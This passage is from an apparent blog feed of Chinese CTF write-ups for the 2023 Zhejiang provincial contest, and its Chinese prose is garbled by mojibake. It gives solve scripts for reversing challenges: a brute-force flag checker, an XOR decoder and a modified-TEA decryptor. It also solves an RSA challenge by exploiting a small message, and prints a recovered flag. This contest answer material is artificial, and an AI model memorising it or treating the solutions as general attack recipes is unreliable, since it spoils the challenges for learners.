: io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><br>s1=<span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span><br>ch=<span class="hljs-string">&quot;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM!@#$^+=%&amp;*()_-&#125;~/.&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">53</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ch)):<br>payload=s1+ch[j]<br>io = process(filename)<br>ru(<span class="hljs-string">&quot;[?] Plz input the flag:&quot;</span>)<br>sl(payload)<br>ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>s2=r()<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;incorrect&#x27;</span> <span class="hljs-keyword">in</span> s2:<br>io.close()<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>s1+=ch[j]<br><span class="hljs-built_in">print</span>(s1)<br>io.close()<br><span class="hljs-keyword">break</span><br><span class="hljs-comment">#inter()</span><br></code></pre></td></tr></table></figure><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1723026552148-d155c9b9-c635-4a5d-b7a9-969e43116fb5.png" class="" title="img"><p>é¸¡å“¥ç›´æ¥é€†å‘çš„ï¼Œä¸»è¦æ˜¯æˆ‘æ¯”èµ›å†™çš„è„šæœ¬ä¸€ç›´å‡ºä¸äº†ï¼Œç”¨pythonè¿˜æ˜¯æœ‰ç‚¹å°trick</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xA8</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x48</span>,<br>  <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x94</span>,<br>  <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x5E</span>,<br>  <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xDE</span>,<br>  <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x26</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br>b23=<span class="hljs-number">0x2b</span><br>b22=<span class="hljs-number">0x8e</span><br>b21=<span class="hljs-number">0x7d</span><br>b24=<span class="hljs-number">0x31</span><br>b25=<span class="hljs-number">0x9c</span><br>b20=<span class="hljs-number">0x4f</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">60</span>,<span class="hljs-number">6</span>):<br>    v8=i-<span class="hljs-number">57</span>+<span class="hljs-number">256</span><span class="hljs-comment">#cè´Ÿæ•°å¯ä»¥å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä½†æ˜¯pyç›´æ¥-57å¾—åˆ°çš„æ˜¯-0x39ï¼Œéœ€è¦åŠ 256</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i,i+<span class="hljs-number">6</span>,<span class="hljs-number">1</span>):<br>        v8=v8&gt;&gt;(j%<span class="hljs-number">3</span>)<br><br>        a[j]^=v8<br><br>    a[i]^=b23<br>    b23+=<span class="hljs-number">1</span><br><br>    a[i+<span class="hljs-number">1</span>]^=b22<br>    b22+=<span class="hljs-number">1</span><br><br>    a[i+<span class="hljs-number">2</span>]^=b21<br>    b21+=<span class="hljs-number">1</span><br><br>    a[i+<span class="hljs-number">3</span>]^=b24<br>    b24+=<span class="hljs-number">1</span><br><br>    a[i+<span class="hljs-number">4</span>]^=b25<br>    b25+=<span class="hljs-number">1</span><br><br>    a[i+<span class="hljs-number">5</span>]^=b20<br>    b20+=<span class="hljs-number">1</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    flag+=<span class="hljs-built_in">chr</span>(a[i])<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>åé¢ç ”ç©¶äº†ä¸€ä¸‹å†™cåè€Œä¸å®¹æ˜“å‡ºé”™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> __int8 v8;<br>    <span class="hljs-type">char</span> a[]=&#123;<span class="hljs-number">0xA8</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x48</span>,<br>              <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x94</span>,<br>              <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x36</span>,<br>              <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x5E</span>,<br>              <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xDE</span>,<br>              <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x26</span>&#125;;<br>    <span class="hljs-type">int</span> b23=<span class="hljs-number">0x2b</span>;<br>    <span class="hljs-type">int</span> b22=<span class="hljs-number">0x8e</span>;<br>    <span class="hljs-type">int</span> b21=<span class="hljs-number">0x7d</span>;<br>    <span class="hljs-type">int</span> b24=<span class="hljs-number">0x31</span>;<br>    <span class="hljs-type">int</span> b25=<span class="hljs-number">0x9c</span>;<br>    <span class="hljs-type">int</span> b20=<span class="hljs-number">0x4f</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">60</span>;i+=<span class="hljs-number">6</span>)&#123;<br>        v8=i<span class="hljs-number">-57</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i;j&lt;i+<span class="hljs-number">6</span>;++j)&#123;<br>            v8=(<span class="hljs-type">int</span>)v8&gt;&gt;(j%<span class="hljs-number">3</span>);<br>            a[j]^=v8;<br>        &#125;<br>        a[i]^=b23++;<br>        a[i+<span class="hljs-number">1</span>]^=b22++;<br>        a[i+<span class="hljs-number">2</span>]^=b21++;<br>        a[i+<span class="hljs-number">3</span>]^=b24++;<br>        a[i+<span class="hljs-number">4</span>]^=b25++;<br>        a[i+<span class="hljs-number">5</span>]^=b20++;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">60</span>;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="apk-re-1"><a href="#apk-re-1" class="headerlink" title="apk_re-1"></a>apk_re-1</h2><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1723019577885-52df344b-f78f-4882-8d0b-3d86796548d2.png" class="" title="img"><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1723026852564-78c32a95-d52e-4ab2-95e8-edb603be89b2.png" class="" title="img"><p>teaé­”æ”¹</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1723080538824-586a93f0-9d8e-4367-aab3-2e5d1b051f4a.png" class="" title="img"><p>è§£å®Œå‘ç°ä¸å¯¹ï¼Œæ‰¾äº†ä¸€ä¸‹å‘ç°è¿˜æœ‰åˆå§‹åŒ–æ“ä½œ(æ„Ÿè°¢yuroâœŒæé†’ï¼‰</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1723080514139-5a122714-ef72-42e2-a28d-8602220cc855.png" class="" title="img"><p>å‰é¢ä¸€éƒ¨åˆ†ç›¸å½“äºç‰¹å¾ç æœç´¢ï¼Œæ‰¾åˆ°i+31çš„åœ°æ–¹æ”¹ä¸º75</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1723221982668-6fb06871-e612-49aa-8938-b6711997f2ee.png" class="" title="img"><p>å¤§æ¦‚ç‡æ˜¯åœ¨teaç®—æ³•ä¸­æœ‰ä¿®æ”¹</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1723222235101-b3905bf7-866e-428d-9d03-984d46d1277e.png" class="" title="img"><p>åŸæ¥çš„0bæ”¹ä¸º4bï¼Œä»addå˜æˆsubï¼Œé‚£å¤§æ¦‚ç‡å°±å¯¹äº†</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1723224496274-7a060096-a6e2-47ad-b032-72f26dc002ee.png" class="" title="img"><p>è¿™é¢˜æ¶å¿ƒçš„ç‚¹åœ¨äºè¾“å…¥çš„é«˜ä½èµ‹ç»™v9ï¼Œv9&#x3D;v7ï¼Œv7æœ€åæ˜¯å¯†æ–‡çš„ä½ä½</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1723224512887-de95c166-09ba-4124-80f4-5861d2efdf9a.png" class="" title="img"><p>è¿˜æœ‰è§£å¯†çš„æ—¶å€™åœ¨å†™ç¬¬å‡ è¡Œåƒä¸‡è¦çœ‹ä»”ç»†ï¼Œæˆ‘çš„ç»éªŒæ˜¯å†™å“ªè¡Œé€‰ä¸­å“ªè¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>]; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x69C36EC5</span>;<br>    <span class="hljs-type">uint32_t</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0xf9540b5c</span>,<span class="hljs-number">0x4bcb6502</span>,<span class="hljs-number">0x68542963</span>,<span class="hljs-number">0x47431049</span>,<span class="hljs-number">0xefd6a62c</span>,<span class="hljs-number">0xd200c2c2</span>,<span class="hljs-number">0x7e9a1b88</span>,<span class="hljs-number">0x3d98999c</span>,<span class="hljs-number">0xe9fbde0d</span>,<span class="hljs-number">0xf17cca00</span>&#125;;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">850486483</span>,<span class="hljs-number">132849155</span>,<span class="hljs-number">881013232</span>,<span class="hljs-number">1124630387</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-comment">// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°</span><br>    <span class="hljs-comment">// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">10</span>; m += <span class="hljs-number">2</span>) &#123;<span class="hljs-comment">//flagä¸å…¨çš„è¯æœ‰å¯èƒ½æ˜¯10</span><br>        sum = <span class="hljs-number">28</span>*delta;<br>        <span class="hljs-type">uint32_t</span> v9=v5[m];<br>        <span class="hljs-type">uint32_t</span> v6=v5[m+<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;=<span class="hljs-number">27</span>; i++) &#123;<br>            sum -= delta;                     <span class="hljs-comment">/* basic cycle start */</span><br>            v9 -= ((v6 &lt;&lt; <span class="hljs-number">5</span>) + <span class="hljs-number">0x348331F0</span>) ^ (v6 + sum+delta) ^ ((v6 &gt;&gt; <span class="hljs-number">4</span>) - <span class="hljs-number">0x43087F73</span>);<br>            v6 -= ((v9 &lt;&lt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x32B164D3</span>) ^ (v9 + sum+delta) ^ ((v9 &gt;&gt; <span class="hljs-number">6</span>) + <span class="hljs-number">0x7EB1E03</span>);<br>            v5[m]=v6;<br>            v5[m+<span class="hljs-number">1</span>]=v9;<br>        &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//DASCTF&#123;1w0,W@NDr01DRe4v3rsE|S150-EA=1sy&#125; </span><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA-1"></a>RSA-1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from flag import flag</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><br><span class="hljs-comment">#assert size(m)&lt;360</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = getPrime(<span class="hljs-number">512</span>)<br>    q = getPrime(<span class="hljs-number">512</span>)<br>    r = getPrime(<span class="hljs-number">512</span>)<br>    s = getPrime(<span class="hljs-number">512</span>)<br>    t = getPrime(<span class="hljs-number">512</span>)<br>    real_p = p * q * r * s * t<br>    real_q = p + q + r + s + t<br>    <span class="hljs-keyword">if</span> isPrime(real_q) == <span class="hljs-literal">True</span>:<br>        n = real_p * real_q<br>        <span class="hljs-keyword">break</span><br><br>e=<span class="hljs-number">65537</span><br><span class="hljs-comment">#c=pow(m,e,n)</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;real_p=&#x27;</span>,real_p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;real_q=&#x27;</span>,real_q)<br><br><span class="hljs-comment">#print(&#x27;c=&#x27;,c)</span><br><br><br>real_p= <span class="hljs-number">55062197317446999463174096263876498316593115551165463378239159905809676640454208209918217385995561457672251651152473557992138742135601815169185076218362135899344751677854110957095631491941800392408438811446405332089775007801060526398896827361974179433880944797942088556569121442758603066960469154848058525555919633585074687002653178371734389317920858433073228324119903275748010661381766238387457768079481851583182446632335485869275973875534654769410510717692168386489418039967948185844825093846853624216235947670855966394462382073931422900372413115651622846475697848013017412006570314438593706146398436291246626158990758006393615755523796444561949003170112244508437710660501492796759763772367048031312446027160494843576151592257914618405347047042441934740949960412334441</span><br>real_q= <span class="hljs-number">45155472176560032394858410670734933043941707240560969397865820853107208563396632699891831616425752109128199454680206954866754585433276759685964959793491769</span><br>c= <span class="hljs-number">29523353286662420447288429739820034783180593797609319451802397100630230980492429018460170953928563500202582346942199142197785013588760361998950680313834852877108490792872966526015601050884302042018430083206594510237759312983601611859463798190030017950871533501858080631812335748118077560727632343411246129300608114305005550505334558174100631528820258311294104339625598892394650057151595693208992748213949675232397315855876112627150056755058037371576593415880216272977089381300018893299243081150404742921857440064511032025713772327330252031889227225225823090259315491541462395033093742723528280894218885823268632726414223235862198062147879817814619506196476372010238569022037192794906574876350397747710442236263832960264742898816690984736558117232240584876068441918457179310704845718452829124188403042383896118962087518608022867798693371250897927956711708162621772577123078819978462483151316840145260542738057960771219011604</span><br></code></pre></td></tr></table></figure><p>real_på¹¶ä¸æ˜¯è´¨æ•°ï¼Œè¦æ±‚phiè¿˜å¾—çŸ¥é“p,q,r,s,tã€‚ç„¶åçœ‹åˆ°assert size(m)&lt;360ï¼ŒmæŒºå°ï¼Œå°±å¯ä»¥æŠŠåŸæœ¬çš„æ¨¡æ•°næ¢æˆæ¨¡æ•°real_qï¼Œè¿™æ ·phi&#x3D;real_q-1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes<br><br>real_p= <span class="hljs-number">55062197317446999463174096263876498316593115551165463378239159905809676640454208209918217385995561457672251651152473557992138742135601815169185076218362135899344751677854110957095631491941800392408438811446405332089775007801060526398896827361974179433880944797942088556569121442758603066960469154848058525555919633585074687002653178371734389317920858433073228324119903275748010661381766238387457768079481851583182446632335485869275973875534654769410510717692168386489418039967948185844825093846853624216235947670855966394462382073931422900372413115651622846475697848013017412006570314438593706146398436291246626158990758006393615755523796444561949003170112244508437710660501492796759763772367048031312446027160494843576151592257914618405347047042441934740949960412334441</span><br>real_q= <span class="hljs-number">45155472176560032394858410670734933043941707240560969397865820853107208563396632699891831616425752109128199454680206954866754585433276759685964959793491769</span><br>c= <span class="hljs-number">29523353286662420447288429739820034783180593797609319451802397100630230980492429018460170953928563500202582346942199142197785013588760361998950680313834852877108490792872966526015601050884302042018430083206594510237759312983601611859463798190030017950871533501858080631812335748118077560727632343411246129300608114305005550505334558174100631528820258311294104339625598892394650057151595693208992748213949675232397315855876112627150056755058037371576593415880216272977089381300018893299243081150404742921857440064511032025713772327330252031889227225225823090259315491541462395033093742723528280894218885823268632726414223235862198062147879817814619506196476372010238569022037192794906574876350397747710442236263832960264742898816690984736558117232240584876068441918457179310704845718452829124188403042383896118962087518608022867798693371250897927956711708162621772577123078819978462483151316840145260542738057960771219011604</span><br><br>e = <span class="hljs-number">65537</span><br>phi = real_q-<span class="hljs-number">1</span><br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, real_q)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>teaé­”æ”¹</tag>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æµ™æ±Ÿçœçœèµ›2023åˆèµ›wp</title>
    <link href="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/"/>
    <url>/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Pyccc"><a href="#Pyccc" class="headerlink" title="Pyccc"></a>Pyccc</h2><p>åœ¨çº¿åç¼–è¯‘å¾—åˆ°pythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;please input your flag:\n&#x27;</span>)<br>check = [<br>    <span class="hljs-number">102</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">88</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">122</span>,<br>    <span class="hljs-number">85</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">105</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">119</span>,<br>    <span 